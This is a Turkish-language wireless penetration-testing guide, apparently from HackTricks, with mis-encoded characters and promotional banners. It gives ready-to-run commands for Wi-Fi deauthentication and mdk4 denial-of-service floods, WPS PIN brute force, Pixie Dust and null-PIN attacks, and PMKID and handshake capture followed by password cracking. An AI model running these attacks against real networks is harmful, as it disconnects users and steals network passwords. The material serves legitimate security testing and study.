# Wifi Temas Testi

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olana kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubunda**](https://discord.gg/hRep4RUj7f) veya [**telegram grubunda**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avÄ± baÅŸlatmalarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgilenin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## Wifi temel komutlarÄ±
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## AraÃ§lar

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon is a versatile tool that can be used for various wireless security tasks, such as attacking WPA/WPA2 PSK WiFi networks, Evil Twin attacks, and more. It automates the process of attacking wireless networks, making it easier for pentesters to test the security of WiFi networks.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Docker ile airgeddon'u Ã§alÄ±ÅŸtÄ±rÄ±n**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Bu, Evil Twin, KARMA ve Known Beacons saldÄ±rÄ±larÄ±nÄ± gerÃ§ekleÅŸtirebilir ve ardÄ±ndan aÄŸÄ±n gerÃ§ek ÅŸifresini elde etmek veya sosyal aÄŸ kimlik bilgilerini yakalamak iÃ§in bir phishing ÅŸablonu kullanabilir.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Bu araÃ§ **WPS/WEP/WPA-PSK** saldÄ±rÄ±larÄ±nÄ± otomatikleÅŸtirir. Otomatik olarak yapacaklarÄ± ÅŸunlardÄ±r:

* ArayÃ¼zÃ¼ izleme moduna ayarlar
* OlasÄ± aÄŸlarÄ± tarar - ve kurban(larÄ±) seÃ§menize izin verir
* EÄŸer WEP ise - WEP saldÄ±rÄ±larÄ± baÅŸlatÄ±r
* EÄŸer WPA-PSK ise
* EÄŸer WPS ise: Pixie dust saldÄ±rÄ±sÄ± ve brute-force saldÄ±rÄ±sÄ± (dikkat brute-force saldÄ±rÄ±sÄ± uzun sÃ¼rebilir). BoÅŸ PIN veya veritabanÄ±/oluÅŸturulan PIN'leri denemez.
* AP'den PMKID'yi yakalamaya Ã§alÄ±ÅŸarak kÄ±rmaya Ã§alÄ±ÅŸÄ±r
* AP'nin istemcilerini deauthenticate etmeye Ã§alÄ±ÅŸarak bir el sÄ±kÄ±ÅŸma yakalamaya Ã§alÄ±ÅŸÄ±r
* EÄŸer PMKID veya El SÄ±kÄ±ÅŸma varsa, top5000 ÅŸifrelerini kullanarak brute-force denemesi yapar.

## SaldÄ±rÄ± Ã–zeti

* **DoS**
* Deauthentication/disassociation -- Herkesi (veya belirli bir ESSID/Ä°stemciyi) baÄŸlantÄ±sÄ±z bÄ±rakÄ±n
* Rastgele sahte AP'ler -- AÄŸlarÄ± gizle, tarayÄ±cÄ±larÄ± Ã§Ã¶kertme olasÄ±lÄ±ÄŸÄ±
* AP'yi aÅŸÄ±rÄ± yÃ¼kleyin -- AP'yi kapatmaya Ã§alÄ±ÅŸÄ±n (genellikle Ã§ok faydalÄ± deÄŸildir)
* WIDS -- IDS ile oynayÄ±n
* TKIP, EAPOL -- BazÄ± Ã¶zel saldÄ±rÄ±lar bazÄ± AP'leri DoS yapmak iÃ§in
* **KÄ±rma**
* **WEP** kÄ±rma (Ã§eÅŸitli araÃ§lar ve yÃ¶ntemler)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** brute-force
* \[DoS +] **WPA el sÄ±kÄ±ÅŸmasÄ±** yakalama + KÄ±rma
* **WPA-MGT**
* **KullanÄ±cÄ± adÄ± yakalama**
* **Bruteforce** Kimlik Bilgileri
* **KÃ¶tÃ¼ Ä°kiz** (DoS ile veya olmadan)
* **AÃ§Ä±k** KÃ¶tÃ¼ Ä°kiz \[+ DoS] -- Tutsak portal kimlik bilgilerini yakalamak ve/veya LAN saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in faydalÄ±dÄ±r
* **WPA-PSK** KÃ¶tÃ¼ Ä°kiz -- Åifreyi bildiÄŸinizde aÄŸ saldÄ±rÄ±larÄ± iÃ§in faydalÄ±dÄ±r
* **WPA-MGT** -- Åirket kimlik bilgilerini yakalamak iÃ§in faydalÄ±dÄ±r
* **KARMA, MANA**, **YÃ¼ksek MANA**, **Bilinen sinyal**
* **+ AÃ§Ä±k** -- Tutsak portal kimlik bilgilerini yakalamak ve/veya LAN saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in faydalÄ±dÄ±r
* **+ WPA** -- WPA el sÄ±kÄ±ÅŸmalarÄ±nÄ± yakalamak iÃ§in faydalÄ±dÄ±r

## DOS

### Deauthentication Paketleri

**Buradan aÃ§Ä±klama**: [**buradan**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** saldÄ±rÄ±larÄ±, Wi-Fi hacklemede yaygÄ±n bir yÃ¶ntem olan, cihazlarÄ± bir aÄŸdan **zorla ayÄ±rmak** iÃ§in "yÃ¶netim" Ã§erÃ§evelerini sahtecilik yaparak kullanÄ±r. Bu ÅŸifrelenmemiÅŸ paketler istemcileri meÅŸru aÄŸdan geldiklerine inandÄ±rarak saldÄ±rganlarÄ±n WPA el sÄ±kÄ±ÅŸmalarÄ±nÄ± kÄ±rmak amacÄ±yla toplamasÄ±na veya aÄŸ baÄŸlantÄ±larÄ±nÄ± sÃ¼rekli olarak kesmesine olanak tanÄ±r. Bu basitliÄŸiyle dikkat Ã§eken taktik, geniÅŸ Ã§apta kullanÄ±lmakta ve aÄŸ gÃ¼venliÄŸi iÃ§in Ã¶nemli sonuÃ§larÄ± bulunmaktadÄ±r.

**Aireplay-ng kullanarak Deauthentication**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 deauthenticatesyonu temsil eder
* 1 gÃ¶nderilecek deauth sayÄ±sÄ±dÄ±r (istediÄŸiniz kadar gÃ¶nderebilirsiniz); 0 bunlarÄ± sÃ¼rekli gÃ¶nder demektir
* \-a 00:14:6C:7E:40:80 eriÅŸim noktasÄ±nÄ±n MAC adresidir
* \-c 00:0F:B5:34:30:30 deauthenticate edilecek istemcinin MAC adresidir; bu belirtilmezse yayÄ±n deauthentication gÃ¶nderilir (her zaman Ã§alÄ±ÅŸmaz)
* ath0 arayÃ¼z adÄ±dÄ±r

### AyÄ±rma Paketleri

**AyÄ±rma paketleri**, deauthentication paketlerine benzer ÅŸekilde Wi-Fi aÄŸlarÄ±nda kullanÄ±lan bir yÃ¶netim Ã§erÃ§evesi tÃ¼rÃ¼dÃ¼r. Bu paketler, bir cihaz (Ã¶rneÄŸin bir dizÃ¼stÃ¼ bilgisayar veya akÄ±llÄ± telefon) ile bir eriÅŸim noktasÄ± (AP) arasÄ±ndaki baÄŸlantÄ±yÄ± kesmeye hizmet eder. AyÄ±rma ve deauthentication arasÄ±ndaki temel fark, kullanÄ±m senaryolarÄ±ndadÄ±r. Bir AP, aÄŸdan aÃ§Ä±kÃ§a yasadÄ±ÅŸÄ± cihazlarÄ± kaldÄ±rmak iÃ§in **deauthentication paketleri yayÄ±nlarken, ayÄ±rma paketleri genellikle AP'nin kapanma, yeniden baÅŸlatma veya taÅŸÄ±nma sÃ¼recinde olduÄŸunda, bu nedenle tÃ¼m baÄŸlÄ± dÃ¼ÄŸÃ¼mlerin baÄŸlantÄ±sÄ±nÄ±n kesilmesi gerektiÄŸinde gÃ¶nderilir.**

**Bu saldÄ±rÄ± mdk4 (mod "d") ile gerÃ§ekleÅŸtirilebilir:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4 ile Daha Fazla DOS SaldÄ±rÄ±sÄ±**

**[Burada](https://en.kali.tools/?p=864)**.

**SALDIRI MODU b: Beacon Seli**

Sahte AP'leri istemcilere gÃ¶stermek iÃ§in beacon Ã§erÃ§eveleri gÃ¶nderir. Bu bazen aÄŸ tarayÄ±cÄ±larÄ±nÄ± ve hatta sÃ¼rÃ¼cÃ¼leri Ã§Ã¶kerteblir!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**SALDIRI MODU a: Kimlik DoÄŸrulama Hizmet DÄ±ÅŸÄ± BÄ±rakma**

EriÅŸilebilir EriÅŸim NoktalarÄ±na (AP'ler) kimlik doÄŸrulama Ã§erÃ§eveleri gÃ¶ndermek, Ã¶zellikle birÃ§ok istemcinin dahil olduÄŸu durumlarda bu AP'leri aÅŸÄ±rÄ± yÃ¼kleyebilir. Bu yoÄŸun trafik, bazÄ± AP'lerin donmasÄ±na veya hatta sÄ±fÄ±rlanmasÄ±na neden olarak sistem kararsÄ±zlÄ±ÄŸÄ±na yol aÃ§abilir.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**SALDIRI MODU p: SSID Sondalama ve Kaba Kuvvet**

EriÅŸim NoktalarÄ±nÄ± (AP'ler) sorgulamak, bir SSID'nin doÄŸru bir ÅŸekilde ortaya Ã§Ä±karÄ±lÄ±p Ã§Ä±karÄ±lmadÄ±ÄŸÄ±nÄ± kontrol eder ve AP'nin menzilini doÄŸrular. Bu teknik, **gizli SSID'leri kaba kuvvetle** veya bir kelime listesi olmadan tespit etmeye ve gizli aÄŸlara eriÅŸmeye yardÄ±mcÄ± olur.

**SALDIRI MODU m: Michael KarÅŸÄ± Ã–nlemler SÃ¶mÃ¼rÃ¼sÃ¼**

FarklÄ± QoS kuyruklarÄ±na rastgele veya yinelenen paketler gÃ¶ndermek, **TKIP AP'lerinde** Michael KarÅŸÄ± Ã–nlemlerini tetikleyebilir ve bir dakikalÄ±k bir AP kapanmasÄ±na yol aÃ§abilir. Bu yÃ¶ntem etkili bir **Hizmet Reddi (DoS)** saldÄ±rÄ± taktiÄŸidir.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**SALDIRI MODU e: EAPOL BaÅŸlatma ve Oturumu SonlandÄ±rma Paketi Enjeksiyonu**

Bir AP'yi **EAPOL BaÅŸlatma Ã§erÃ§eveleri** ile doldurmak, **sahte oturumlar** oluÅŸturur, AP'yi aÅŸÄ±rÄ± yÃ¼kler ve meÅŸru istemcileri engeller. Alternatif olarak, **sahte EAPOL Oturumu SonlandÄ±rma mesajlarÄ±** enjekte etmek, istemcileri zorla baÄŸlantÄ±dan koparÄ±r, her iki yÃ¶ntem de aÄŸ hizmetini etkili bir ÅŸekilde kesintiye uÄŸratÄ±r.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**SALDIRI MODU s: IEEE 802.11s aÄŸlarÄ± iÃ§in SaldÄ±rÄ±lar**

AÄŸ baÄŸlantÄ± yÃ¶netimi ve yÃ¶nlendirme Ã¼zerine Ã§eÅŸitli saldÄ±rÄ±lar mesh aÄŸlarÄ±nda.

**SALDIRI MODU w: WIDS KarÄ±ÅŸÄ±klÄ±ÄŸÄ±**

Ä°stemci cihazlarÄ±, birden fazla WDS dÃ¼ÄŸÃ¼mÃ¼ne veya sahte sahte AP'lere Ã§apraz baÄŸlamak, SÄ±zma Tespit ve Ã–nleme Sistemlerini manipÃ¼le edebilir, karÄ±ÅŸÄ±klÄ±k yaratarak potansiyel sistem kÃ¶tÃ¼ye kullanÄ±mÄ±na neden olabilir.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**SALDIRI MODU f: Paket Fuzzer**

Paket manipÃ¼lasyonu iÃ§in Ã§eÅŸitli paket kaynaklarÄ± ve kapsamlÄ± bir dizi deÄŸiÅŸtirici iÃ§eren bir paket fuzzer.

### **Airggedon**

_**Airgeddon**_, Ã¶nceki yorumlarda Ã¶nerilen Ã§oÄŸu saldÄ±rÄ±yÄ± sunar:

![](<../../.gitbook/assets/image (92).png>)

## WPS

WPS (Wi-Fi Protected Setup), cihazlarÄ±n bir yÃ¶nlendiriciye baÄŸlanma sÃ¼recini basitleÅŸtirir, **WPA** veya **WPA2** KiÅŸisel ile ÅŸifrelenmiÅŸ aÄŸlar iÃ§in kurulum hÄ±zÄ±nÄ± ve kolaylÄ±ÄŸÄ±nÄ± artÄ±rÄ±r. Kolayca tehlikeye atÄ±lan WEP gÃ¼venliÄŸi iÃ§in etkisizdir. WPS, sÄ±nÄ±rlÄ± kombinasyon sayÄ±sÄ±ndan dolayÄ± kaba kuvvet saldÄ±rÄ±larÄ±na duyarlÄ± olacak ÅŸekilde, iki yarÄ±da doÄŸrulanan 8 haneli bir PIN kullanÄ±r (11.000 olasÄ±lÄ±k).

### WPS Kaba Kuvvet

Bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in 2 ana araÃ§ bulunmaktadÄ±r: Reaver ve Bully.

* **Reaver**, WPS'ye karÅŸÄ± gÃ¼Ã§lÃ¼ ve pratik bir saldÄ±rÄ± olmasÄ± iÃ§in tasarlanmÄ±ÅŸtÄ±r ve Ã§eÅŸitli eriÅŸim noktalarÄ± ve WPS uygulamalarÄ±na karÅŸÄ± test edilmiÅŸtir.
* **Bully**, C'de yazÄ±lmÄ±ÅŸ WPS kaba kuvvet saldÄ±rÄ±sÄ±nÄ±n **yeni bir uygulamasÄ±**dÄ±r. Orijinal reaver koduna gÃ¶re birkaÃ§ avantaja sahiptir: daha az baÄŸÄ±mlÄ±lÄ±k, geliÅŸtirilmiÅŸ bellek ve iÅŸlemci performansÄ±, endianness'Ä±n doÄŸru iÅŸlenmesi ve daha saÄŸlam bir dizi seÃ§enek.

SaldÄ±rÄ±, Ã¶zellikle ilk dÃ¶rt hanesinin aÃ§Ä±ÄŸa Ã§Ä±kmasÄ±nÄ± ve son hanesinin bir kontrol rakamÄ± olarak iÅŸlev gÃ¶rmesini kolaylaÅŸtÄ±rarak **WPS PIN'in zafiyetini** sÃ¶mÃ¼rÃ¼r, kaba kuvvet saldÄ±rÄ±sÄ±nÄ± kolaylaÅŸtÄ±rÄ±r. Ancak, **agresif saldÄ±rganlarÄ±n MAC adreslerini engelleyen** kaba kuvvet saldÄ±rÄ±larÄ±na karÅŸÄ± savunmalar, saldÄ±rÄ±yÄ± sÃ¼rdÃ¼rmek iÃ§in **MAC adresi dÃ¶nÃ¼ÅŸÃ¼mÃ¼** gerektirir.

Bully veya Reaver gibi araÃ§larla WPS PIN'i elde ettikten sonra saldÄ±rgan, **kalÄ±cÄ± aÄŸ eriÅŸimini** saÄŸlayarak WPA/WPA2 PSK'yi Ã§Ä±karabilir.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**AkÄ±llÄ± Kaba Kuvvet**

Bu geliÅŸtirilmiÅŸ yaklaÅŸÄ±m, bilinen zayÄ±flÄ±klarÄ± kullanarak WPS PIN'lerini hedefler:

1. **Ã–nceden KeÅŸfedilmiÅŸ PIN'ler**: Belirli Ã¼reticilerin belirli WPS PIN'lerini kullandÄ±ÄŸÄ± bilinen PIN'ler veritabanÄ±nÄ± kullanÄ±n. Bu veritabanÄ±, MAC adreslerinin ilk Ã¼Ã§ oktetini bu Ã¼reticiler iÃ§in muhtemel PIN'lerle iliÅŸkilendirir.
2. **PIN OluÅŸturma AlgoritmalarÄ±**: ComputePIN ve EasyBox gibi algoritmalarÄ± kullanarak, AP'nin MAC adresine dayalÄ± olarak WPS PIN'leri hesaplayÄ±n. Arcadyan algoritmasÄ± ayrÄ±ca bir cihaz kimliÄŸi gerektirir ve PIN oluÅŸturma sÃ¼recine bir katman ekler.

### WPS Pixie Dust saldÄ±rÄ±sÄ±

**Dominique Bongard**, bazÄ± EriÅŸim NoktalarÄ±nda (AP'ler) gizli kodlarÄ±n oluÅŸturulmasÄ±yla ilgili bir hata keÅŸfetti, bu kodlar **nonce'lar** olarak bilinir (**E-S1** ve **E-S2**). Bu nonce'lar Ã§Ã¶zÃ¼lebilirse, AP'nin WPS PIN'inin kÄ±rÄ±lmasÄ± kolaylaÅŸÄ±r. AP, PIN'i meÅŸru olduÄŸunu ve sahte (dolandÄ±rÄ±cÄ±) bir AP olmadÄ±ÄŸÄ±nÄ± kanÄ±tlamak iÃ§in Ã¶zel bir kodda (hash) PIN'i ortaya Ã§Ä±karÄ±r. Bu nonce'lar temelde WPS PIN'i tutan "kasanÄ±n" kilidini aÃ§manÄ±n "anahtarlarÄ±"dÄ±r. Daha fazla bilgiye [buradan](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)) ulaÅŸÄ±labilir.

BasitÃ§e sÃ¶ylemek gerekirse, sorun ÅŸudur ki bazÄ± AP'ler, baÄŸlantÄ± sÃ¼recinde PIN'i ÅŸifrelemek iÃ§in yeterince rastgele anahtarlar kullanmamÄ±ÅŸtÄ±r. Bu, PIN'in aÄŸ dÄ±ÅŸÄ±ndan tahmin edilmesine karÅŸÄ± savunmasÄ±z hale getirir (Ã§evrimdÄ±ÅŸÄ± kaba kuvvet saldÄ±rÄ±sÄ±).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
EÄŸer cihazÄ± izleme moduna geÃ§irmek istemiyorsanÄ±z veya `reaver` ve `bully`'de bir sorun varsa, [OneShot-C](https://github.com/nikita-yfh/OneShot-C)Ä± deneyebilirsiniz. Bu araÃ§, izleme moduna geÃ§meden Pixie Dust saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirebilir.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin saldÄ±rÄ±sÄ±

BazÄ± kÃ¶tÃ¼ tasarlanmÄ±ÅŸ sistemler, oldukÃ§a alÄ±ÅŸÄ±lmadÄ±k olan bir ÅŸekilde **Null PIN** (boÅŸ veya mevcut olmayan bir PIN) ile eriÅŸime izin verir. **Reaver** aracÄ±, **Bully**'nin aksine, bu zafiyeti test etme yeteneÄŸine sahiptir.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

TÃ¼m Ã¶nerilen WPS saldÄ±rÄ±larÄ± kolayca _**airgeddon**_ kullanÄ±larak gerÃ§ekleÅŸtirilebilir.

![](<../../.gitbook/assets/image (216).png>)

* 5 ve 6, **Ã¶zel PIN'inizi** denemenizi saÄŸlar (varsa)
* 7 ve 8 **Pixie Dust saldÄ±rÄ±sÄ±nÄ±** gerÃ§ekleÅŸtirir
* 13, **NULL PIN'i** test etmenize olanak tanÄ±r
* 11 ve 12, seÃ§ilen AP ile ilgili PIN'leri **mevcut veritabanlarÄ±ndan toplar** ve ComputePIN, EasyBox ve isteÄŸe baÄŸlÄ± olarak Arcadyan (tavsiye edilen, neden olmasÄ±n?) kullanarak olasÄ± **PIN'ler** Ã¼retir
* 9 ve 10, **her olasÄ± PIN'i** test eder

## **WEP**

ArtÄ±k kÄ±rÄ±k ve kullanÄ±lmayan bir ÅŸifreleme yÃ¶ntemi. Sadece _**airgeddon**_'un bu tÃ¼r korumayÄ± hedefleyen "All-in-One" adlÄ± bir WEP seÃ§eneÄŸi olduÄŸunu bilin. Benzer seÃ§enekler sunan daha fazla araÃ§ bulunmaktadÄ±r.

![](<../../.gitbook/assets/image (429).png>)

***

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n ve deneyimli hackerlar ve hata avcÄ±larÄ± ile iletiÅŸim kurun!

**Hacking Insights**\
Hacking'in heyecanÄ±nÄ± ve zorluklarÄ±nÄ± inceleyen iÃ§eriklerle etkileÅŸime geÃ§in

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni hata avcÄ±lÄ±klarÄ±nÄ± ve Ã¶nemli platform gÃ¼ncellemelerini takip edin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!**

***

## WPA/WPA2 PSK

### PMKID

2018'de **hashcat**, sadece **bir tek paket** gerektiren ve hedef AP'ye baÄŸlÄ± herhangi bir istemcinin olmasÄ±nÄ± gerektirmeyen benzersiz bir saldÄ±rÄ± yÃ¶ntemi olan **PMKID**'yi [aÃ§Ä±kladÄ±](https://hashcat.net/forum/thread-7717.html).

BirÃ§ok modern yÃ¶nlendirici, birliÄŸe katÄ±lÄ±m sÄ±rasÄ±nda **ilk EAPOL** Ã§erÃ§evesine **isteÄŸe baÄŸlÄ± bir alan** ekler, `Robust Security Network` olarak bilinen. Bu, `PMKID`'yi iÃ§erir.

Orijinal gÃ¶nderi aÃ§Ä±kladÄ±ÄŸÄ± gibi, **PMKID** bilinen veriler kullanÄ±larak oluÅŸturulur:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Verilen "PMK AdÄ±" sabit olduÄŸunda, AP'nin ve istasyonun BSSID'sini biliyoruz ve `PMK` tam 4 yÃ¶nlÃ¼ el sÄ±kÄ±ÅŸmadan aynÄ±dÄ±r, **hashcat** bu bilgileri kullanarak PSK'yi kÄ±rmak ve parolayÄ± kurtarmak iÃ§in kullanÄ±labilir!

Bu bilgileri **toplamak** ve yerel olarak ÅŸifreyi **kaba kuvvet** ile denemek iÃ§in ÅŸunlarÄ± yapabilirsiniz:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**Yakalanan PMKIDs** konsolda gÃ¶sterilecek ve ayrÄ±ca \_/tmp/attack.pcap\_ iÃ§ine **kaydedilecek**\
Åimdi, yakalanan veriyi **hashcat/john** formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rÃ¼n ve kÄ±rÄ±n:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
LÃ¼tfen doÄŸru bir karmasÄ±k formatÄ±n **4 bÃ¶lÃ¼mden** oluÅŸtuÄŸuna dikkat edin, Ã¶rneÄŸin: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` EÄŸer sizinki **yalnÄ±zca 3 bÃ¶lÃ¼mden** oluÅŸuyorsa, o zaman **geÃ§ersizdir** (PMKID yakalama geÃ§erli deÄŸildi).

`hcxdumptool` **ayrÄ±ca el sÄ±kÄ±ÅŸmalarÄ±nÄ± da yakalar** (ÅŸuna benzer bir ÅŸey gÃ¶rÃ¼necektir: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). El sÄ±kÄ±ÅŸmalarÄ±nÄ± **hashcat**/**john** formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rebilirsiniz, bunun iÃ§in `cap2hccapx` kullanabilirsiniz.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
### El sÄ±kÄ±ÅŸtÄ±rma

**WPA/WPA2** aÄŸlarÄ±na yÃ¶nelik bir saldÄ±rÄ±, bir **el sÄ±kÄ±ÅŸmasÄ±nÄ±n** yakalanmasÄ± ve ÅŸifrenin **Ã§evrimdÄ±ÅŸÄ± olarak kÄ±rÄ±lma** giriÅŸimiyle gerÃ§ekleÅŸtirilebilir. Bu sÃ¼reÃ§, belirli bir aÄŸÄ±n ve **BSSID**'nin belirli bir **kanalÄ±ndaki** iletiÅŸimin izlenmesini iÃ§erir. Ä°ÅŸte basitleÅŸtirilmiÅŸ bir rehber:

1. Hedef aÄŸÄ±n **BSSID**, **kanal** ve **baÄŸlÄ± istemcisi**ni belirleyin.
2. Belirtilen kanal ve BSSID Ã¼zerinde aÄŸ trafiÄŸini izlemek iÃ§in `airodump-ng` kullanÄ±n ve bir el sÄ±kÄ±ÅŸmasÄ± yakalamayÄ± umun. Komut ÅŸÃ¶yle olacaktÄ±r:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Bir el sÄ±kÄ±ÅŸmasÄ±nÄ± yakalama ÅŸansÄ±nÄ± artÄ±rmak iÃ§in, istemciyi aÄŸdan kÄ±sa bir sÃ¼reliÄŸine ayÄ±rarak yeniden kimlik doÄŸrulamasÄ±nÄ± zorlayabilirsiniz. Bu, istemciye dekimasyon paketleri gÃ¶nderen `aireplay-ng` komutu kullanÄ±larak yapÄ±labilir:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_KiÅŸinin dekimendiÄŸi zaman, farklÄ± bir AP'ye baÄŸlanmaya Ã§alÄ±ÅŸabileceÄŸini veya baÅŸka durumlarda farklÄ± bir aÄŸa baÄŸlanabileceÄŸini unutmayÄ±n._

